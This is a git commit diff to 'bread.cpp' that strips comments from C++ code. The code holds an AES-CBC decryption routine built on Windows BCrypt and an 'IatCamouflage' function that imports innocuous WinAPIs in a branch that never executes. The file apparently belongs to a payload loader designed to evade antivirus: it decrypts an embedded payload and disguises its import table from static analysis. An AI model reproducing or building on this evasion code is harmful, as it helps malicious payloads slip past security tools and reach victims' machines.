a55f0c475c22b9f9d4c690f729af27c09c9a04dd
tehstoni <stevenharrisskater66@hotmail.com>
2024-03-11 14:24:57 -0400

    Update bread.cpp
    removed comments

--- bread.cpp
+++ bread.cpp
@@ -22,15 +22,15 @@
 #define IVSIZE          16
 
 typedef struct _AES {
-    PBYTE   pPlainText;             // base address of the plain text data
-    DWORD   dwPlainSize;            // size of the plain text data
-    PVOID   pCipherText;            // base address of the encrypted data
-    DWORD   dwCipherSize;           // size of it (this can change from dwPlainSize in case there was padding)
-    PBYTE   pKey;                   // the 32 byte key
-    PBYTE   pIv;                    // the 16 byte iv
+    PBYTE   pPlainText;             
+    DWORD   dwPlainSize;            
+    PVOID   pCipherText;            
+    DWORD   dwCipherSize;           
+    PBYTE   pKey;                   
+    PBYTE   pIv;                    
 }AES, * PAES;
 
-// the real decryption implemantation
+
 BOOL InstallAesDecryption(PAES pAes) {
     BOOL bSTATE = TRUE;
     BCRYPT_ALG_HANDLE hAlgorithm = NULL;
@@ -42,56 +42,56 @@ BOOL InstallAesDecryption(PAES pAes) {
     PBYTE pbPlainText = NULL;
     DWORD cbPlainText = NULL;
     NTSTATUS STATUS = NULL;
-    // intializing "hAlgorithm" as AES algorithm Handle
+    
     STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
     if (!NT_SUCCESS(STATUS)) {
         bSTATE = FALSE; goto _EndOfFunc;
     }
-    // getting the size of the key object variable *pbKeyObject* this is used for BCryptGenerateSymmetricKey function later
+    
     STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
     if (!NT_SUCCESS(STATUS)) {
         bSTATE = FALSE; goto _EndOfFunc;
     }
-    // getting the size of the block used in the encryption, since this is aes it should be 16 (this is what AES does)
+    
     STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
     if (!NT_SUCCESS(STATUS)) {
         bSTATE = FALSE; goto _EndOfFunc;
     }
-    // checking if block size is 16
+    
     if (dwBlockSize != 16) {
         bSTATE = FALSE; goto _EndOfFunc;
     }
-    // allocating memory for the key object
+    
     pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
     if (pbKeyObject == NULL) {
         bSTATE = FALSE; goto _EndOfFunc;
     }
-    // setting Block Cipher Mode to CBC (32 byte key and 16 byte Iv)
+    
     STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
     if (!NT_SUCCESS(STATUS)) {
         bSTATE = FALSE; goto _EndOfFunc;
     }
-    // generating the key object from the aes key "pAes->pKey", the output will be saved in "pbKeyObject" of size "cbKeyObject"
+    
     STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
     if (!NT_SUCCESS(STATUS)) {
         bSTATE = FALSE; goto _EndOfFunc;
     }
-    // running BCryptDecrypt first time with NULL output parameters, thats to deduce the size of the output buffer, (the size will be saved in cbPlainText)
+    
     STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
     if (!NT_SUCCESS(STATUS)) {
         bSTATE = FALSE; goto _EndOfFunc;
     }
-    // allocating enough memory (of size cbPlainText)
+    
     pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
     if (pbPlainText == NULL) {
         bSTATE = FALSE; goto _EndOfFunc;
     }
-    // running BCryptDecrypt second time with "pbPlainText" as output buffer
+    
     STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
     if (!NT_SUCCESS(STATUS)) {
         bSTATE = FALSE; goto _EndOfFunc;
     }
-    // cleaning up
+    
 _EndOfFunc:
     if (hKeyHandle) {
         BCryptDestroyKey(hKeyHandle);
@@ -103,14 +103,14 @@ _EndOfFunc:
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
     }
     if (pbPlainText != NULL && bSTATE) {
-        // if everything went well, we save pbPlainText and cbPlainText
+        
         pAes->pPlainText = pbPlainText;
         pAes->dwPlainSize = cbPlainText;
     }
     return bSTATE;
 }
 
-// wrapper function for InstallAesDecryption that make things easier
+
 BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
     if (pCipherTextData == NULL || sCipherTextSize == 0 || pKey == NULL || pIv == NULL)
         return FALSE;
@@ -214,32 +214,32 @@ int RandomCompileTimeSeed(void)
 }
 
 
-// A dummy function that makes the if-statement in 'IatCamouflage' interesting
+
 PVOID Helper(PVOID *ppAddress) {
 
 	PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
 	if (!pAddress)
 		return NULL;
 	
-	// setting the first 4 bytes in pAddress to be equal to a random number (less than 255)
+	
 	*(int*)pAddress = RandomCompileTimeSeed() % 0xFF;
 	
-	// saving the base address by pointer, and returning it 
+	
 	*ppAddress = pAddress;
 	return pAddress;
 }
 
 
-// Function that imports WinAPIs but never uses them
+
 VOID IatCamouflage() {
 
 	PVOID		pAddress	= NULL;
 	int*		A		    = (int*)Helper(&pAddress);
 	
-	// Impossible if-statement that will never run
+	
 	if (*A > 350) {
 
-		// some random whitelisted WinAPIs
+		
 		unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
 		i = GetLastError();
 		i = SetCriticalSectionSpinCount(NULL, NULL);
@@ -252,7 +252,7 @@ VOID IatCamouflage() {
 		i = IsDialogMessageW(NULL, NULL);
 	}
 
-	// Freeing the buffer allocated in 'Helper'
+	
 	HeapFree(GetProcessHeap(), 0, pAddress);
 }
 
